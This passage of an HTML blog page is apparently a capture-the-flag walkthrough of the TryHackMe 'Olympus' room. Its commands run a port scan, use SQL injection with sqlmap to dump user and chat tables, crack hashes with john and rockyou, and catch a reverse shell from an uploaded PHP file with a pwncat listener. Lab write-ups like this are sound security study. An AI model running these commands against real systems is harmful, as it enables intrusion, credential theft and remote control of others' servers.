@@ -1,0 +1,545 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title class="pjax-title">Olympus - Blog</title><meta name="Description" content="This is My New Hugo Site"><meta property="og:title" content="Olympus" />
+<meta property="og:description" content="Olympus Scanning:- Nmap:- nmap -A -T4 -p- [ IP ] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 0a:78:14:04:2c:df:25:fb:4e:a2:14:34:80:0b:85:39 (RSA) | 256 8d:56:01:ca:55:de:e1:7c:64:04:ce:e6:f1:a5:c7:ac (ECDSA) |_ 256 1f:c1:be:3f:9c:e7:8e:24:33:34:a6:44:af:68:4c:3c (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Olympus |_http-server-header: Apache/2." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://clgar.github.io/thm/oly/" /><meta property="og:image" content="https://clgar.github.io/logo.png"/><meta property="article:section" content="thm" />
+<meta property="article:published_time" content="2022-08-15T00:01:31+05:30" />
+<meta property="article:modified_time" content="2022-08-15T00:01:31+05:30" /><meta property="og:site_name" content="My New Hugo Site" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://clgar.github.io/logo.png"/>
+
+<meta name="twitter:title" content="Olympus"/>
+<meta name="twitter:description" content="Olympus Scanning:- Nmap:- nmap -A -T4 -p- [ IP ] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 0a:78:14:04:2c:df:25:fb:4e:a2:14:34:80:0b:85:39 (RSA) | 256 8d:56:01:ca:55:de:e1:7c:64:04:ce:e6:f1:a5:c7:ac (ECDSA) |_ 256 1f:c1:be:3f:9c:e7:8e:24:33:34:a6:44:af:68:4c:3c (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Olympus |_http-server-header: Apache/2."/>
+<meta name="application-name" content="DoIt">
+<meta name="apple-mobile-web-app-title" content="DoIt">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://clgar.github.io/thm/oly/" /><link rel="prev" href="https://clgar.github.io/thm/agent/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Olympus",
+        "inLanguage": "en-us",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/clgar.github.io\/thm\/oly\/"
+        },"genre": "thm","wordcount":  322 ,
+        "url": "https:\/\/clgar.github.io\/thm\/oly\/","datePublished": "2022-08-15T00:01:31+05:30","dateModified": "2022-08-15T00:01:31+05:30","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "CIGAR"
+            },"description": ""
+    }
+    </script></head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark');}
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Blog"><span class="header-title-pre"><i class='fas fa-terminal'></i></span><span id="desktop-header-typeit" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/about/"><i class='fa fa-heart'></i> about </a><a class="menu-item" href="/ctf/">🏁 CTF </a><a class="menu-item" href="/project/">🛠 Projects </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="#" onclick="return false;" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="#" onclick="return false;" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="#" onclick="return false;" class="menu-item theme-select" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="Switch Theme">
+                        <option value="light">Light</option>
+                        <option value="dark">Dark</option>
+                        <option value="black">Black</option>
+                        <option value="auto">Auto</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Blog"><span class="header-title-pre"><i class='fas fa-terminal'></i></span><span id="mobile-header-typeit" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="#" onclick="return false;" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="#" onclick="return false;" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="#" onclick="return false;" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/about/" title=""><i class='fa fa-heart'></i>about</a><a class="menu-item" href="/ctf/" title="">🏁CTF</a><a class="menu-item" href="/project/" title="">🛠Projects</a><a href="#" onclick="return false;" class="menu-item theme-select" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="Switch Theme">
+                    <option value="light">Light</option>
+                    <option value="dark">Dark</option>
+                    <option value="black">Black</option>
+                    <option value="auto">Auto</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="page single special"><h1 class="single-title animate__animated animate__pulse animate__faster">Olympus</h1><div class="content" id="content"><h1 id="olympus" class="headerLink">
+    <a href="#olympus" class="header-mark"></a>Olympus</h1><img align="center" width="300" height="300" src="/Olympus%20870874c406d24325b2bb22aa5bbf2058/oly.jpeg">
+<h2 id="scanning-" class="headerLink">
+    <a href="#scanning-" class="header-mark"></a><strong>Scanning:-</strong></h2><h3 id="nmap-" class="headerLink">
+    <a href="#nmap-" class="header-mark"></a><strong>Nmap:-</strong></h3><h2 id="nmap--a--t4--p---ip-" class="headerLink">
+    <a href="#nmap--a--t4--p---ip-" class="header-mark"></a>nmap -A -T4 -p- [ IP ]</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+</span></span><span class="line"><span class="cl">| ssh-hostkey: 
+</span></span><span class="line"><span class="cl">|   3072 0a:78:14:04:2c:df:25:fb:4e:a2:14:34:80:0b:85:39 (RSA)
+</span></span><span class="line"><span class="cl">|   256 8d:56:01:ca:55:de:e1:7c:64:04:ce:e6:f1:a5:c7:ac (ECDSA)
+</span></span><span class="line"><span class="cl">|_  256 1f:c1:be:3f:9c:e7:8e:24:33:34:a6:44:af:68:4c:3c (ED25519)
+</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+</span></span><span class="line"><span class="cl">|_http-title: Olympus
+</span></span><span class="line"><span class="cl">|_http-server-header: Apache/2.4.41 (Ubuntu)
+</span></span><span class="line"><span class="cl">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+</span></span><span class="line"><span class="cl">TCP/IP fingerprint:
+</span></span><span class="line"><span class="cl">OS:SCAN(V=7.92%E=4%D=7/18%OT=22%CT=1%CU=33277%PV=Y%DS=2%DC=T%G=Y%TM=62D505F
+</span></span><span class="line"><span class="cl">OS:6%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=101%TI=Z%CI=Z%II=I%TS=A)OPS(
+</span></span><span class="line"><span class="cl">OS:O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11
+</span></span><span class="line"><span class="cl">OS:NW7%O6=M505ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(
+</span></span><span class="line"><span class="cl">OS:R=Y%DF=Y%T=40%W=F507%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
+</span></span><span class="line"><span class="cl">OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
+</span></span><span class="line"><span class="cl">OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
+</span></span><span class="line"><span class="cl">OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
+</span></span><span class="line"><span class="cl">OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
+</span></span><span class="line"><span class="cl">OS:S)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Network Distance: 2 hops
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="etchosts" class="headerLink">
+    <a href="#etchosts" class="header-mark"></a><strong>/etc/hosts</strong></h2><p><img
+        class="lazyload"
+        data-src="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled.png"
+        data-srcset="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled.png, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled.png 1.5x, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled.png 2x"
+        data-sizes="auto"
+        alt="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled.png"
+        title="Untitled"></p>
+<p><img
+        class="lazyload"
+        data-src="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%201.png"
+        data-srcset="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%201.png, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%201.png 1.5x, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%201.png 2x"
+        data-sizes="auto"
+        alt="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%201.png"
+        title="Untitled"></p>
+<h2 id="olympusthm" class="headerLink">
+    <a href="#olympusthm" class="header-mark"></a><strong>olympus.thm</strong></h2><p><img
+        class="lazyload"
+        data-src="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%202.png"
+        data-srcset="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%202.png, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%202.png 1.5x, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%202.png 2x"
+        data-sizes="auto"
+        alt="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%202.png"
+        title="Untitled"></p>
+<h2 id="enumeration" class="headerLink">
+    <a href="#enumeration" class="header-mark"></a><strong>enumeration</strong></h2><p><img
+        class="lazyload"
+        data-src="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%203.png"
+        data-srcset="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%203.png, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%203.png 1.5x, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%203.png 2x"
+        data-sizes="auto"
+        alt="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%203.png"
+        title="Untitled"></p>
+<h2 id="visit-olympusthm" class="headerLink">
+    <a href="#visit-olympusthm" class="header-mark"></a>Visit Olympus.thm</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">**http://olympus.thm/~webmaster/**
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        data-src="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%204.png"
+        data-srcset="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%204.png, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%204.png 1.5x, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%204.png 2x"
+        data-sizes="auto"
+        alt="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%204.png"
+        title="Untitled"></p>
+<h2 id="exploit" class="headerLink">
+    <a href="#exploit" class="header-mark"></a>Exploit</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">https://www.exploit-db.com/exploits/48734
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="sql-injection" class="headerLink">
+    <a href="#sql-injection" class="header-mark"></a>SQL injection</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">	sqlmap -u &#34;http://olympus.thm/~webmaster/search.php&#34; --data=&#34;search=1337*<span class="err">&amp;</span>submit=&#34; --dbs --random-agent -v 3
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        data-src="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%205.png"
+        data-srcset="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%205.png, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%205.png 1.5x, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%205.png 2x"
+        data-sizes="auto"
+        alt="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%205.png"
+        title="Untitled"></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">sqlmap -u &#34;http://olympus.thm/~webmaster/search.php&#34; --data=&#34;search=1337*<span class="err">&amp;</span>submit=&#34; -D olympus --random-agent -v 3 --batch --tables
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        data-src="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%206.png"
+        data-srcset="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%206.png, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%206.png 1.5x, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%206.png 2x"
+        data-sizes="auto"
+        alt="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%206.png"
+        title="Untitled"></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">sqlmap -u &#34;http://olympus.thm/~webmaster/search.php&#34; --data=&#34;search=1337*<span class="err">&amp;</span>submit=&#34; -D olympus --random-agent -v 3 --batch -T users --dump
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        data-src="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%207.png"
+        data-srcset="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%207.png, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%207.png 1.5x, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%207.png 2x"
+        data-sizes="auto"
+        alt="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%207.png"
+        title="Untitled"></p>
+<h2 id="cracking-hashes" class="headerLink">
+    <a href="#cracking-hashes" class="header-mark"></a><strong>Cracking Hashes</strong></h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">sudo john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        data-src="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%208.png"
+        data-srcset="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%208.png, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%208.png 1.5x, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%208.png 2x"
+        data-sizes="auto"
+        alt="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%208.png"
+        title="Untitled"></p>
+<h2 id="login" class="headerLink">
+    <a href="#login" class="header-mark"></a><strong>Login</strong></h2><p><img
+        class="lazyload"
+        data-src="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%209.png"
+        data-srcset="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%209.png, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%209.png 1.5x, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%209.png 2x"
+        data-sizes="auto"
+        alt="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%209.png"
+        title="Untitled"></p>
+<p><img
+        class="lazyload"
+        data-src="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2010.png"
+        data-srcset="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2010.png, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2010.png 1.5x, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2010.png 2x"
+        data-sizes="auto"
+        alt="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2010.png"
+        title="Untitled"></p>
+<h2 id="sub-domain" class="headerLink">
+    <a href="#sub-domain" class="header-mark"></a><strong>Sub domain</strong></h2><p><img
+        class="lazyload"
+        data-src="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2011.png"
+        data-srcset="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2011.png, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2011.png 1.5x, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2011.png 2x"
+        data-sizes="auto"
+        alt="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2011.png"
+        title="Untitled"></p>
+<p><strong>Let’s add subdomain in hosts</strong></p>
+<h2 id="visit-chatolympusthm" class="headerLink">
+    <a href="#visit-chatolympusthm" class="header-mark"></a>Visit chat.Olympus.thm</h2><p><img
+        class="lazyload"
+        data-src="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2012.png"
+        data-srcset="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2012.png, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2012.png 1.5x, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2012.png 2x"
+        data-sizes="auto"
+        alt="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2012.png"
+        title="Untitled"></p>
+<h2 id="login-1" class="headerLink">
+    <a href="#login-1" class="header-mark"></a><strong>Login</strong></h2><p><strong>Reuse the old credentials which we found earlier</strong></p>
+<p><img
+        class="lazyload"
+        data-src="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2013.png"
+        data-srcset="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2013.png, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2013.png 1.5x, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2013.png 2x"
+        data-sizes="auto"
+        alt="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2013.png"
+        title="Untitled"></p>
+<h2 id="reverse-shell" class="headerLink">
+    <a href="#reverse-shell" class="header-mark"></a><strong>Reverse Shell</strong></h2><p><strong>Send a php reverse shell file.</strong></p>
+<p><img
+        class="lazyload"
+        data-src="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2014.png"
+        data-srcset="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2014.png, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2014.png 1.5x, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2014.png 2x"
+        data-sizes="auto"
+        alt="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2014.png"
+        title="Untitled"></p>
+<p><strong>We cannot access the file by the original name.The file name changed after the files upload.Let’s use SQL injection again to find the name of the file.</strong></p>
+<p><strong>Filname:-</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">sqlmap -u &#34;http://olympus.thm/~webmaster/search.php&#34; --data=&#34;search=1337*<span class="err">&amp;</span>submit=&#34; -D olympus --random-agent -v 3 --batch --tables
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        data-src="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2015.png"
+        data-srcset="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2015.png, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2015.png 1.5x, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2015.png 2x"
+        data-sizes="auto"
+        alt="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2015.png"
+        title="Untitled"></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">sqlmap -u &#34;http://olympus.thm/~webmaster/search.php&#34; --data=&#34;search=1337*<span class="err">&amp;</span>submit=&#34; -D olympus --random-agent -v 3 --batch -T chats --dump
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        data-src="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2016.png"
+        data-srcset="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2016.png, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2016.png 1.5x, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2016.png 2x"
+        data-sizes="auto"
+        alt="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2016.png"
+        title="Untitled"></p>
+<p>Exploiting:-</p>
+<p>Start Listener:-</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">sudo pwncat-cs -l -p 1234
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Visit the link:-</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">http://chat.olympus.thm/uploads/1323f6d43cd467f78da284dee8106534.php
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        data-src="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2017.png"
+        data-srcset="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2017.png, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2017.png 1.5x, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2017.png 2x"
+        data-sizes="auto"
+        alt="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2017.png"
+        title="Untitled"></p>
+<h2 id="local-privilege-escalation-" class="headerLink">
+    <a href="#local-privilege-escalation-" class="header-mark"></a>Local Privilege Escalation:-</h2><p><img
+        class="lazyload"
+        data-src="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2018.png"
+        data-srcset="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2018.png, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2018.png 1.5x, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2018.png 2x"
+        data-sizes="auto"
+        alt="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2018.png"
+        title="Untitled"></p>
+<p><strong>Generate ssh key:-</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">ssh-keygen
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        data-src="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2019.png"
+        data-srcset="/Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2019.png, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2019.png 1.5x, /Olympus%20870874c406d24325b2bb22aa5bbf2058/Untitled%2019.png 2x"
